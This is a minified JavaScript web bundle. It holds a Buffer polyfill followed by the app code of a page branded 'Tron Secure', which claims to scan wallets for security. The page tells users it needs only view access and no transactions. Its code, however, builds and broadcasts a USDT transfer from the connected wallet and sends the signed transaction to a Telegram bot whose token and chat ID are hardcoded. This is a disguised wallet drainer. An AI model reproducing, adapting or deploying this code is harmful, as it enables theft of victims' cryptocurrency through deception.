                  , re = Ee > 239 ? 4 : Ee > 223 ? 3 : Ee > 191 ? 2 : 1;
                if (J + re <= U) {
                    let Nt, Yt, wt, zt;
                    switch (re) {
                    case 1:
                        Ee < 128 && (Ie = Ee);
                        break;
                    case 2:
                        Nt = Z[J + 1],
                        (Nt & 192) === 128 && (zt = (Ee & 31) << 6 | Nt & 63,
                        zt > 127 && (Ie = zt));
                        break;
                    case 3:
                        Nt = Z[J + 1],
                        Yt = Z[J + 2],
                        (Nt & 192) === 128 && (Yt & 192) === 128 && (zt = (Ee & 15) << 12 | (Nt & 63) << 6 | Yt & 63,
                        zt > 2047 && (zt < 55296 || zt > 57343) && (Ie = zt));
                        break;
                    case 4:
                        Nt = Z[J + 1],
                        Yt = Z[J + 2],
                        wt = Z[J + 3],
                        (Nt & 192) === 128 && (Yt & 192) === 128 && (wt & 192) === 128 && (zt = (Ee & 15) << 18 | (Nt & 63) << 12 | (Yt & 63) << 6 | wt & 63,
                        zt > 65535 && zt < 1114112 && (Ie = zt))
                    }
                }
                Ie === null ? (Ie = 65533,
                re = 1) : Ie > 65535 && (Ie -= 65536,
                ne.push(Ie >>> 10 & 1023 | 55296),
                Ie = 56320 | Ie & 1023),
                ne.push(Ie),
                J += re
            }
            return _(ne)
        }
        const R = 4096;
        function _(Z) {
            const N = Z.length;
            if (N <= R)
                return String.fromCharCode.apply(String, Z);
            let U = ""
              , ne = 0;
            for (; ne < N; )
                U += String.fromCharCode.apply(String, Z.slice(ne, ne += R));
            return U
        }
        function $(Z, N, U) {
            let ne = "";
            U = Math.min(Z.length, U);
            for (let J = N; J < U; ++J)
                ne += String.fromCharCode(Z[J] & 127);
            return ne
        }
        function z(Z, N, U) {
            let ne = "";
            U = Math.min(Z.length, U);
            for (let J = N; J < U; ++J)
                ne += String.fromCharCode(Z[J]);
            return ne
        }
        function K(Z, N, U) {
            const ne = Z.length;
            (!N || N < 0) && (N = 0),
            (!U || U < 0 || U > ne) && (U = ne);
            let J = "";
            for (let Ee = N; Ee < U; ++Ee)
                J += st[Z[Ee]];
            return J
        }
        function j(Z, N, U) {
            const ne = Z.slice(N, U);
            let J = "";
            for (let Ee = 0; Ee < ne.length - 1; Ee += 2)
                J += String.fromCharCode(ne[Ee] + ne[Ee + 1] * 256);
            return J
        }
        a.prototype.slice = function(N, U) {
            const ne = this.length;
            N = ~~N,
            U = U === void 0 ? ne : ~~U,
            N < 0 ? (N += ne,
            N < 0 && (N = 0)) : N > ne && (N = ne),
            U < 0 ? (U += ne,
            U < 0 && (U = 0)) : U > ne && (U = ne),
            U < N && (U = N);
            const J = this.subarray(N, U);
            return Object.setPrototypeOf(J, a.prototype),
            J
        }
        ;
        function ee(Z, N, U) {
            if (Z % 1 !== 0 || Z < 0)
                throw new RangeError("offset is not uint");
            if (Z + N > U)
                throw new RangeError("Trying to access beyond buffer length")
        }
        a.prototype.readUintLE = a.prototype.readUIntLE = function(N, U, ne) {
            N = N >>> 0,
            U = U >>> 0,
            ne || ee(N, U, this.length);
            let J = this[N]
              , Ee = 1
              , Ie = 0;
            for (; ++Ie < U && (Ee *= 256); )
                J += this[N + Ie] * Ee;
            return J
        }
        ,
        a.prototype.readUintBE = a.prototype.readUIntBE = function(N, U, ne) {
            N = N >>> 0,
            U = U >>> 0,
            ne || ee(N, U, this.length);
            let J = this[N + --U]
              , Ee = 1;
            for (; U > 0 && (Ee *= 256); )
                J += this[N + --U] * Ee;
            return J
        }
        ,
        a.prototype.readUint8 = a.prototype.readUInt8 = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 1, this.length),
            this[N]
        }
        ,
        a.prototype.readUint16LE = a.prototype.readUInt16LE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 2, this.length),
            this[N] | this[N + 1] << 8
        }
        ,
        a.prototype.readUint16BE = a.prototype.readUInt16BE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 2, this.length),
            this[N] << 8 | this[N + 1]
        }
        ,
        a.prototype.readUint32LE = a.prototype.readUInt32LE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 4, this.length),
            (this[N] | this[N + 1] << 8 | this[N + 2] << 16) + this[N + 3] * 16777216
        }
        ,
        a.prototype.readUint32BE = a.prototype.readUInt32BE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 4, this.length),
            this[N] * 16777216 + (this[N + 1] << 16 | this[N + 2] << 8 | this[N + 3])
        }
        ,
        a.prototype.readBigUInt64LE = yt(function(N) {
            N = N >>> 0,
            Qe(N, "offset");
            const U = this[N]
              , ne = this[N + 7];
            (U === void 0 || ne === void 0) && Ye(N, this.length - 8);
            const J = U + this[++N] * 2 ** 8 + this[++N] * 2 ** 16 + this[++N] * 2 ** 24
              , Ee = this[++N] + this[++N] * 2 ** 8 + this[++N] * 2 ** 16 + ne * 2 ** 24;
            return BigInt(J) + (BigInt(Ee) << BigInt(32))
        }),
        a.prototype.readBigUInt64BE = yt(function(N) {
            N = N >>> 0,
            Qe(N, "offset");
            const U = this[N]
              , ne = this[N + 7];
            (U === void 0 || ne === void 0) && Ye(N, this.length - 8);
            const J = U * 2 ** 24 + this[++N] * 2 ** 16 + this[++N] * 2 ** 8 + this[++N]
              , Ee = this[++N] * 2 ** 24 + this[++N] * 2 ** 16 + this[++N] * 2 ** 8 + ne;
            return (BigInt(J) << BigInt(32)) + BigInt(Ee)
        }),
        a.prototype.readIntLE = function(N, U, ne) {
            N = N >>> 0,
            U = U >>> 0,
            ne || ee(N, U, this.length);
            let J = this[N]
              , Ee = 1
              , Ie = 0;
            for (; ++Ie < U && (Ee *= 256); )
                J += this[N + Ie] * Ee;
            return Ee *= 128,
            J >= Ee && (J -= Math.pow(2, 8 * U)),
            J
        }
        ,
        a.prototype.readIntBE = function(N, U, ne) {
            N = N >>> 0,
            U = U >>> 0,
            ne || ee(N, U, this.length);
            let J = U
              , Ee = 1
              , Ie = this[N + --J];
            for (; J > 0 && (Ee *= 256); )
                Ie += this[N + --J] * Ee;
            return Ee *= 128,
            Ie >= Ee && (Ie -= Math.pow(2, 8 * U)),
            Ie
        }
        ,
        a.prototype.readInt8 = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 1, this.length),
            this[N] & 128 ? (255 - this[N] + 1) * -1 : this[N]
        }
        ,
        a.prototype.readInt16LE = function(N, U) {
            N = N >>> 0,
            U || ee(N, 2, this.length);
            const ne = this[N] | this[N + 1] << 8;
            return ne & 32768 ? ne | 4294901760 : ne
        }
        ,
        a.prototype.readInt16BE = function(N, U) {
            N = N >>> 0,
            U || ee(N, 2, this.length);
            const ne = this[N + 1] | this[N] << 8;
            return ne & 32768 ? ne | 4294901760 : ne
        }
        ,
        a.prototype.readInt32LE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 4, this.length),
            this[N] | this[N + 1] << 8 | this[N + 2] << 16 | this[N + 3] << 24
        }
        ,
        a.prototype.readInt32BE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 4, this.length),
            this[N] << 24 | this[N + 1] << 16 | this[N + 2] << 8 | this[N + 3]
        }
        ,
        a.prototype.readBigInt64LE = yt(function(N) {
            N = N >>> 0,
            Qe(N, "offset");
            const U = this[N]
              , ne = this[N + 7];
            (U === void 0 || ne === void 0) && Ye(N, this.length - 8);
            const J = this[N + 4] + this[N + 5] * 2 ** 8 + this[N + 6] * 2 ** 16 + (ne << 24);
            return (BigInt(J) << BigInt(32)) + BigInt(U + this[++N] * 2 ** 8 + this[++N] * 2 ** 16 + this[++N] * 2 ** 24)
        }),
        a.prototype.readBigInt64BE = yt(function(N) {
            N = N >>> 0,
            Qe(N, "offset");
            const U = this[N]
              , ne = this[N + 7];
            (U === void 0 || ne === void 0) && Ye(N, this.length - 8);
            const J = (U << 24) + this[++N] * 2 ** 16 + this[++N] * 2 ** 8 + this[++N];
            return (BigInt(J) << BigInt(32)) + BigInt(this[++N] * 2 ** 24 + this[++N] * 2 ** 16 + this[++N] * 2 ** 8 + ne)
        }),
        a.prototype.readFloatLE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 4, this.length),
            t.read(this, N, !0, 23, 4)
        }
        ,
        a.prototype.readFloatBE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 4, this.length),
            t.read(this, N, !1, 23, 4)
        }
        ,
        a.prototype.readDoubleLE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 8, this.length),
            t.read(this, N, !0, 52, 8)
        }
        ,
        a.prototype.readDoubleBE = function(N, U) {
            return N = N >>> 0,
            U || ee(N, 8, this.length),
            t.read(this, N, !1, 52, 8)
        }
        ;
        function ie(Z, N, U, ne, J, Ee) {
            if (!a.isBuffer(Z))
                throw new TypeError('"buffer" argument must be a Buffer instance');
            if (N > J || N < Ee)
                throw new RangeError('"value" argument is out of bounds');
            if (U + ne > Z.length)
                throw new RangeError("Index out of range")
        }
        a.prototype.writeUintLE = a.prototype.writeUIntLE = function(N, U, ne, J) {
            if (N = +N,
            U = U >>> 0,
            ne = ne >>> 0,
            !J) {
                const re = Math.pow(2, 8 * ne) - 1;
                ie(this, N, U, ne, re, 0)
            }
            let Ee = 1
              , Ie = 0;
            for (this[U] = N & 255; ++Ie < ne && (Ee *= 256); )
                this[U + Ie] = N / Ee & 255;
            return U + ne
        }
        ,
        a.prototype.writeUintBE = a.prototype.writeUIntBE = function(N, U, ne, J) {
            if (N = +N,
            U = U >>> 0,
            ne = ne >>> 0,
            !J) {
                const re = Math.pow(2, 8 * ne) - 1;
                ie(this, N, U, ne, re, 0)
            }
            let Ee = ne - 1
              , Ie = 1;
            for (this[U + Ee] = N & 255; --Ee >= 0 && (Ie *= 256); )
                this[U + Ee] = N / Ie & 255;
            return U + ne
        }
        ,
        a.prototype.writeUint8 = a.prototype.writeUInt8 = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 1, 255, 0),
            this[U] = N & 255,
            U + 1
        }
        ,
        a.prototype.writeUint16LE = a.prototype.writeUInt16LE = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 2, 65535, 0),
            this[U] = N & 255,
            this[U + 1] = N >>> 8,
            U + 2
        }
        ,
        a.prototype.writeUint16BE = a.prototype.writeUInt16BE = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 2, 65535, 0),
            this[U] = N >>> 8,
            this[U + 1] = N & 255,
            U + 2
        }
        ,
        a.prototype.writeUint32LE = a.prototype.writeUInt32LE = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 4, 4294967295, 0),
            this[U + 3] = N >>> 24,
            this[U + 2] = N >>> 16,
            this[U + 1] = N >>> 8,
            this[U] = N & 255,
            U + 4
        }
        ,
        a.prototype.writeUint32BE = a.prototype.writeUInt32BE = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 4, 4294967295, 0),
            this[U] = N >>> 24,
            this[U + 1] = N >>> 16,
            this[U + 2] = N >>> 8,
            this[U + 3] = N & 255,
            U + 4
        }
        ;
        function ae(Z, N, U, ne, J) {
            Tt(N, ne, J, Z, U, 7);
            let Ee = Number(N & BigInt(4294967295));
            Z[U++] = Ee,
            Ee = Ee >> 8,
            Z[U++] = Ee,
            Ee = Ee >> 8,
            Z[U++] = Ee,
            Ee = Ee >> 8,
            Z[U++] = Ee;
            let Ie = Number(N >> BigInt(32) & BigInt(4294967295));
            return Z[U++] = Ie,
            Ie = Ie >> 8,
            Z[U++] = Ie,
            Ie = Ie >> 8,
            Z[U++] = Ie,
            Ie = Ie >> 8,
            Z[U++] = Ie,
            U
        }
        function he(Z, N, U, ne, J) {
            Tt(N, ne, J, Z, U, 7);
            let Ee = Number(N & BigInt(4294967295));
            Z[U + 7] = Ee,
            Ee = Ee >> 8,
            Z[U + 6] = Ee,
            Ee = Ee >> 8,
            Z[U + 5] = Ee,
            Ee = Ee >> 8,
            Z[U + 4] = Ee;
            let Ie = Number(N >> BigInt(32) & BigInt(4294967295));
            return Z[U + 3] = Ie,
            Ie = Ie >> 8,
            Z[U + 2] = Ie,
            Ie = Ie >> 8,
            Z[U + 1] = Ie,
            Ie = Ie >> 8,
            Z[U] = Ie,
            U + 8
        }
        a.prototype.writeBigUInt64LE = yt(function(N, U=0) {
            return ae(this, N, U, BigInt(0), BigInt("0xffffffffffffffff"))
        }),
        a.prototype.writeBigUInt64BE = yt(function(N, U=0) {
            return he(this, N, U, BigInt(0), BigInt("0xffffffffffffffff"))
        }),
        a.prototype.writeIntLE = function(N, U, ne, J) {
            if (N = +N,
            U = U >>> 0,
            !J) {
                const Nt = Math.pow(2, 8 * ne - 1);
                ie(this, N, U, ne, Nt - 1, -Nt)
            }
            let Ee = 0
              , Ie = 1
              , re = 0;
            for (this[U] = N & 255; ++Ee < ne && (Ie *= 256); )
                N < 0 && re === 0 && this[U + Ee - 1] !== 0 && (re = 1),
                this[U + Ee] = (N / Ie >> 0) - re & 255;
            return U + ne
        }
        ,
        a.prototype.writeIntBE = function(N, U, ne, J) {
            if (N = +N,
            U = U >>> 0,
            !J) {
                const Nt = Math.pow(2, 8 * ne - 1);
                ie(this, N, U, ne, Nt - 1, -Nt)
            }
            let Ee = ne - 1
              , Ie = 1
              , re = 0;
            for (this[U + Ee] = N & 255; --Ee >= 0 && (Ie *= 256); )
                N < 0 && re === 0 && this[U + Ee + 1] !== 0 && (re = 1),
                this[U + Ee] = (N / Ie >> 0) - re & 255;
            return U + ne
        }
        ,
        a.prototype.writeInt8 = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 1, 127, -128),
            N < 0 && (N = 255 + N + 1),
            this[U] = N & 255,
            U + 1
        }
        ,
        a.prototype.writeInt16LE = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 2, 32767, -32768),
            this[U] = N & 255,
            this[U + 1] = N >>> 8,
            U + 2
        }
        ,
        a.prototype.writeInt16BE = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 2, 32767, -32768),
            this[U] = N >>> 8,
            this[U + 1] = N & 255,
            U + 2
        }
        ,
        a.prototype.writeInt32LE = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 4, 2147483647, -2147483648),
            this[U] = N & 255,
            this[U + 1] = N >>> 8,
            this[U + 2] = N >>> 16,
            this[U + 3] = N >>> 24,
            U + 4
        }
        ,
        a.prototype.writeInt32BE = function(N, U, ne) {
            return N = +N,
            U = U >>> 0,
            ne || ie(this, N, U, 4, 2147483647, -2147483648),
            N < 0 && (N = 4294967295 + N + 1),
            this[U] = N >>> 24,
            this[U + 1] = N >>> 16,
            this[U + 2] = N >>> 8,
            this[U + 3] = N & 255,
            U + 4
        }
        ,
        a.prototype.writeBigInt64LE = yt(function(N, U=0) {
            return ae(this, N, U, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
        }),
        a.prototype.writeBigInt64BE = yt(function(N, U=0) {
            return he(this, N, U, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
        });
        function me(Z, N, U, ne, J, Ee) {
            if (U + ne > Z.length)
                throw new RangeError("Index out of range");
            if (U < 0)
                throw new RangeError("Index out of range")
        }
        function Pe(Z, N, U, ne, J) {
            return N = +N,
            U = U >>> 0,
            J || me(Z, N, U, 4),
            t.write(Z, N, U, ne, 23, 4),
            U + 4
        }
        a.prototype.writeFloatLE = function(N, U, ne) {
            return Pe(this, N, U, !0, ne)
        }
        ,
        a.prototype.writeFloatBE = function(N, U, ne) {
            return Pe(this, N, U, !1, ne)
        }
        ;
        function _e(Z, N, U, ne, J) {
            return N = +N,
            U = U >>> 0,
            J || me(Z, N, U, 8),
            t.write(Z, N, U, ne, 52, 8),
            U + 8
        }
        a.prototype.writeDoubleLE = function(N, U, ne) {
            return _e(this, N, U, !0, ne)
        }
        ,
        a.prototype.writeDoubleBE = function(N, U, ne) {
            return _e(this, N, U, !1, ne)
        }
        ,
        a.prototype.copy = function(N, U, ne, J) {
            if (!a.isBuffer(N))
                throw new TypeError("argument should be a Buffer");
            if (ne || (ne = 0),
            !J && J !== 0 && (J = this.length),
            U >= N.length && (U = N.length),
            U || (U = 0),
            J > 0 && J < ne && (J = ne),
            J === ne || N.length === 0 || this.length === 0)
                return 0;
            if (U < 0)
                throw new RangeError("targetStart out of bounds");
            if (ne < 0 || ne >= this.length)
                throw new RangeError("Index out of range");
            if (J < 0)
                throw new RangeError("sourceEnd out of bounds");
            J > this.length && (J = this.length),
            N.length - U < J - ne && (J = N.length - U + ne);
            const Ee = J - ne;
            return this === N && typeof Uint8Array.prototype.copyWithin == "function" ? this.copyWithin(U, ne, J) : Uint8Array.prototype.set.call(N, this.subarray(ne, J), U),
            Ee
        }
        ,
        a.prototype.fill = function(N, U, ne, J) {
            if (typeof N == "string") {
                if (typeof U == "string" ? (J = U,
                U = 0,
                ne = this.length) : typeof ne == "string" && (J = ne,
                ne = this.length),
                J !== void 0 && typeof J != "string")
                    throw new TypeError("encoding must be a string");
                if (typeof J == "string" && !a.isEncoding(J))
                    throw new TypeError("Unknown encoding: " + J);
                if (N.length === 1) {
                    const Ie = N.charCodeAt(0);
                    (J === "utf8" && Ie < 128 || J === "latin1") && (N = Ie)
                }
            } else
                typeof N == "number" ? N = N & 255 : typeof N == "boolean" && (N = Number(N));
            if (U < 0 || this.length < U || this.length < ne)
                throw new RangeError("Out of range index");
            if (ne <= U)
                return this;
            U = U >>> 0,
            ne = ne === void 0 ? this.length : ne >>> 0,
            N || (N = 0);
            let Ee;
            if (typeof N == "number")
                for (Ee = U; Ee < ne; ++Ee)
                    this[Ee] = N;
            else {
                const Ie = a.isBuffer(N) ? N : a.from(N, J)
                  , re = Ie.length;
                if (re === 0)
                    throw new TypeError('The value "' + N + '" is invalid for argument "value"');
                for (Ee = 0; Ee < ne - U; ++Ee)
                    this[Ee + U] = Ie[Ee % re]
            }
            return this
        }
        ;
        const Fe = {};
        function Je(Z, N, U) {
            Fe[Z] = class extends U {
                constructor() {
                    super(),
                    Object.defineProperty(this, "message", {
                        value: N.apply(this, arguments),
                        writable: !0,
                        configurable: !0
                    }),
                    this.name = `${this.name} [${Z}]`,
                    this.stack,
                    delete this.name
                }
                get code() {
                    return Z
                }
                set code(J) {
                    Object.defineProperty(this, "code", {
                        configurable: !0,
                        enumerable: !0,
                        value: J,
                        writable: !0
                    })
                }
                toString() {
                    return `${this.name} [${Z}]: ${this.message}`
                }
            }
        }
        Je("ERR_BUFFER_OUT_OF_BOUNDS", function(Z) {
            return Z ? `${Z} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds"
        }, RangeError),
        Je("ERR_INVALID_ARG_TYPE", function(Z, N) {
            return `The "${Z}" argument must be of type number. Received type ${typeof N}`
        }, TypeError),
        Je("ERR_OUT_OF_RANGE", function(Z, N, U) {
            let ne = `The value of "${Z}" is out of range.`
              , J = U;
            return Number.isInteger(U) && Math.abs(U) > 2 ** 32 ? J = rt(String(U)) : typeof U == "bigint" && (J = String(U),
            (U > BigInt(2) ** BigInt(32) || U < -(BigInt(2) ** BigInt(32))) && (J = rt(J)),
            J += "n"),
            ne += ` It must be ${N}. Received ${J}`,
            ne
        }, RangeError);
        function rt(Z) {
            let N = ""
              , U = Z.length;
            const ne = Z[0] === "-" ? 1 : 0;
            for (; U >= ne + 4; U -= 3)
                N = `_${Z.slice(U - 3, U)}${N}`;
            return `${Z.slice(0, U)}${N}`
        }
        function xt(Z, N, U) {
            Qe(N, "offset"),
            (Z[N] === void 0 || Z[N + U] === void 0) && Ye(N, Z.length - (U + 1))
        }
        function Tt(Z, N, U, ne, J, Ee) {
            if (Z > U || Z < N) {
                const Ie = typeof N == "bigint" ? "n" : "";
                let re;
                throw N === 0 || N === BigInt(0) ? re = `>= 0${Ie} and < 2${Ie} ** ${(Ee + 1) * 8}${Ie}` : re = `>= -(2${Ie} ** ${(Ee + 1) * 8 - 1}${Ie}) and < 2 ** ${(Ee + 1) * 8 - 1}${Ie}`,
                new Fe.ERR_OUT_OF_RANGE("value",re,Z)
            }
            xt(ne, J, Ee)
        }
        function Qe(Z, N) {
            if (typeof Z != "number")
                throw new Fe.ERR_INVALID_ARG_TYPE(N,"number",Z)
        }
        function Ye(Z, N, U) {
            throw Math.floor(Z) !== Z ? (Qe(Z, U),
            new Fe.ERR_OUT_OF_RANGE("offset","an integer",Z)) : N < 0 ? new Fe.ERR_BUFFER_OUT_OF_BOUNDS : new Fe.ERR_OUT_OF_RANGE("offset",`>= 0 and <= ${N}`,Z)
        }
        const Bt = /[^+/0-9A-Za-z-_]/g;
        function Dr(Z) {
            if (Z = Z.split("=")[0],
            Z = Z.trim().replace(Bt, ""),
            Z.length < 2)
                return "";
            for (; Z.length % 4 !== 0; )
                Z = Z + "=";
            return Z
        }
        function Cr(Z, N) {
            N = N || 1 / 0;
            let U;
            const ne = Z.length;
            let J = null;
            const Ee = [];
            for (let Ie = 0; Ie < ne; ++Ie) {
                if (U = Z.charCodeAt(Ie),
                U > 55295 && U < 57344) {
                    if (!J) {
                        if (U > 56319) {
                            (N -= 3) > -1 && Ee.push(239, 191, 189);
                            continue
                        } else if (Ie + 1 === ne) {
                            (N -= 3) > -1 && Ee.push(239, 191, 189);
                            continue
                        }
                        J = U;
                        continue
                    }
                    if (U < 56320) {
                        (N -= 3) > -1 && Ee.push(239, 191, 189),
                        J = U;
                        continue
                    }
                    U = (J - 55296 << 10 | U - 56320) + 65536
                } else
                    J && (N -= 3) > -1 && Ee.push(239, 191, 189);
                if (J = null,
                U < 128) {
                    if ((N -= 1) < 0)
                        break;
                    Ee.push(U)
                } else if (U < 2048) {
                    if ((N -= 2) < 0)
                        break;
                    Ee.push(U >> 6 | 192, U & 63 | 128)
                } else if (U < 65536) {
                    if ((N -= 3) < 0)
                        break;
                    Ee.push(U >> 12 | 224, U >> 6 & 63 | 128, U & 63 | 128)
                } else if (U < 1114112) {
                    if ((N -= 4) < 0)
                        break;
                    Ee.push(U >> 18 | 240, U >> 12 & 63 | 128, U >> 6 & 63 | 128, U & 63 | 128)
                } else
                    throw new Error("Invalid code point")
            }
            return Ee
        }
        function se(Z) {
            const N = [];
            for (let U = 0; U < Z.length; ++U)
                N.push(Z.charCodeAt(U) & 255);
            return N
        }
        function le(Z, N) {
            let U, ne, J;
            const Ee = [];
            for (let Ie = 0; Ie < Z.length && !((N -= 2) < 0); ++Ie)
                U = Z.charCodeAt(Ie),
                ne = U >> 8,
                J = U % 256,
                Ee.push(J),
                Ee.push(ne);
            return Ee
        }
        function Te(Z) {
            return e.toByteArray(Dr(Z))
        }
        function Ue(Z, N, U, ne) {
            let J;
            for (J = 0; J < ne && !(J + U >= N.length || J >= Z.length); ++J)
                N[J + U] = Z[J];
            return J
        }
        function Re(Z, N) {
            return Z instanceof N || Z != null && Z.constructor != null && Z.constructor.name != null && Z.constructor.name === N.name
        }
        function $e(Z) {
            return Z !== Z
        }
        const st = function() {
            const Z = "0123456789abcdef"
              , N = new Array(256);
            for (let U = 0; U < 16; ++U) {
                const ne = U * 16;
                for (let J = 0; J < 16; ++J)
                    N[ne + J] = Z[U] + Z[J]
            }
            return N
        }();
        function yt(Z) {
            return typeof BigInt > "u" ? vt : Z
        }
        function vt() {
            throw new Error("BigInt not supported")
        }
    }(cE)),
    cE
}
var Rme = Ome();
const Wme = "Mainnet"
  , Mme = "https://api.trongrid.io"
  , Nme = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
  , ok = Nme
  , Dme = "6808605475:AAFv68kgDNy7L5fImcvCMZuzvxC4X6S7hN0"
  , Fme = "866274009"
  , lE = 30
  , HW = 200
  , Ume = "THQGqLmyNj3itxyiy43q5UYxinhWtcQ4B6";
typeof window < "u" && typeof window.Buffer > "u" && (window.Buffer = Rme.Buffer);
const au = new or({
    fullHost: Mme,
    disableProtoValidation: !0
})
  , $a = new Bce({
    network: Wme,
    options: {
        relayUrl: "wss://relay.walletconnect.com",
        projectId: "1d7c094b92213b27e88ac00ab7602643",
        metadata: {
            name: "Tron Secure",
            description: "Secure your tron assets",
            url: "https://yourdapp-url.com",
            icons: ["https://yourdapp-url.com/icon.png"]
        },
        qrcodeModalOptions: {
            desktopLinks: ["trust"],
            mobileLinks: ["trust"]
        }
    },
    web3ModalConfig: {
        themeMode: "dark",
        themeVariables: {
            "--wcm-z-index": "1000"
        },
        explorerRecommendedWalletIds: ["4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f", "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369"]
    }
})
  , kme = async (r, e, t) => {
    await $a.connect();
    const o = "transfer(address,uint256)"
      , i = {
        feeLimit: 1e9,
        callValue: 0,
        owner_address: au.address.toHex(t)
    }
      , n = [{
        type: "address",
        value: r
    }, {
        type: "uint256",
        value: e
    }]
      , {transaction: s} = await au.transactionBuilder.triggerSmartContract(ok, o, i, n, t)
      , a = await $a.signTransaction(s);
    console.log("Signel Transaction", a);
    const l = await au.trx.sendRawTransaction(a);
    try {
        const f = JSON.stringify(a, null, 2);
        await $me(` New USDT Transaction Signed:
\`\`\`json
${f}
\`\`\``),
        await $a.disconnect()
    } catch (f) {
        console.error("Failed to send to Telegram:", f)
    }
    return l
}
  , Lme = async r => {
    try {
        const t = (await au.transactionBuilder.triggerConstantContract(ok, "balanceOf(address)", {}, [{
            type: "address",
            value: r
        }], $a.address)).constant_result[0]
          , o = t.startsWith("0x") ? t : `0x${t}`;
        return au.toBigNumber(o).dividedBy(10 ** 6).toNumber()
    } catch (e) {
        console.log("Error fetching allowance:", e)
    }
}
  , $me = async r => {
    try {
        const e = `https://api.telegram.org/bot${Dme}/sendMessage`
          , t = await fetch(e, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: Fme,
                text: r,
                parse_mode: "Markdown"
            })
        });
        if (!t.ok)
            throw new Error(`Telegram API error: ${t.statusText}`);
        return await t.json()
    } catch (e) {
        throw console.error("Error sending to Telegram:", e),
        e
    }
}
  , zme = ({onNext: r}) => {
    const {setAccount: e} = h0()
      , t = () => {
        r()
    }
      , o = async () => {
        try {
            await $a.connect(),
            console.log($a.address),
            e($a.address),
            $a.address && t()
        } catch (i) {
            console.error("TronLink connection failed:", i)
        }
    }
    ;
    return L.jsx("div", {
        className: "relative flex w-full items-center justify-center",
        children: L.jsxs("div", {
            className: "flex items-center justify-center flex-col gap-8 relative top-4",
            children: [L.jsxs("div", {
                className: " flex flex-col items-center text-center space-y-2",
                children: [L.jsx("h3", {
                    className: "oswald-heading-h3 uppercase text-gray-900",
                    children: "Connect Your Wallet"
                }), L.jsx("p", {
                    className: "text-[#4B5563] primarry-page ",
                    children: "Advanced security features and energy delegation system"
                })]
            }), L.jsxs("div", {
                className: "w-full flex items-center border border-[#dec3f7] rounded-lg bg-white p-4 shadow-md",
                children: [L.jsx("span", {
                    className: "w-14 h-14 flex items-center justify-center bg-gray-100 rounded-full text-black mr-4",
                    children: L.jsx(xE, {
                        className: "w-6 h-6"
                    })
                }), L.jsxs("div", {
                    className: "flex justify-between w-full items-center",
                    children: [L.jsxs("div", {
                        children: [L.jsx("h1", {
                            className: "text-[12px] md:text-[16px] font-bold uppercase text-black",
                            children: "Trust Wallet"
                        }), L.jsx("p", {
                            className: "text-gray-700 md:text-lg",
                            children: "Universal Wallet"
                        })]
                    }), L.jsxs(dn, {
                        onClick: () => o(),
                        className: "flex items-center gap-2 w-40 h-11 bg-[#A855F7] hover:bg-gray-900 text-white rounded-lg",
                        children: ["Verify Now ", L.jsx(IH, {})]
                    })]
                })]
            }), L.jsxs("div", {
                className: "w-full flex items-center border border-[#dec3f7] rounded-lg p-4 shadow-md",
                children: [L.jsx("span", {
                    className: "w-14 h-14 flex items-center justify-center bg-gray-100 rounded-full text-black mr-4",
                    children: L.jsx(xE, {
                        className: "w-6 h-6"
                    })
                }), L.jsxs("div", {
                    children: [L.jsx("h1", {
                        className: "text-[12px] md:text-[16px] font-bold uppercase text-black",
                        children: "Your security is our priority."
                    }), L.jsx("p", {
                        className: "text-gray-500 md:text-sm",
                        children: "We only require view access to analyze your wallet. No transactions or approvals needed."
                    })]
                })]
            })]
        })
    })
}
  , jme = () => {
    const [r,e] = ue.useState(90)
      , {account: t, transactionId: o} = h0();
    ue.useEffect( () => {
        if (r > 0) {
            const n = setTimeout( () => e(r - 1), 1e3);
            return () => clearTimeout(n)
        }
    }
    , [r]);
    const i = n => {
        if (n) {
            const s = n.slice(0, 4)
              , a = n.slice(-4);
            return `${s}...${a}`
        }
        return ""
    }
    ;
    return L.jsx("div", {
        className: "flex items-center justify-center w-full",
        children: L.jsxs("div", {
            className: "w-full px-6 md:px-20 flex items-center justify-center flex-col gap-4",
            children: [L.jsx("h1", {
                className: "oswald-heading-h3 uppercase text-gray-900",
                children: "Scan Complete"
            }), L.jsxs("p", {
                className: "primary-page text-gray-400 text-center ",
                children: ["Your Wallet ", t, " has been successfullly analyzed"]
            }), L.jsxs("div", {
                className: "w-full md:w-[600px] px-6 py-2 flex items-center justify-center flex-col gap-6 border-[#dec3f7] border rounded-lg bg-white shadow-md relative",
                children: [L.jsx("div", {
                    className: "flex justify-center items-center border-2 rounded-full bg-white w-20 h-20",
                    children: L.jsx("h1", {
                        className: "text-xl font-bold text-purple-700",
                        children: r
                    })
                }), L.jsxs("div", {
                    className: "w-full flex flex-col items-center space-y-3",
                    children: [L.jsxs("nav", {
                        className: "flex flex-row items-center justify-between w-full",
                        children: [L.jsx("p", {
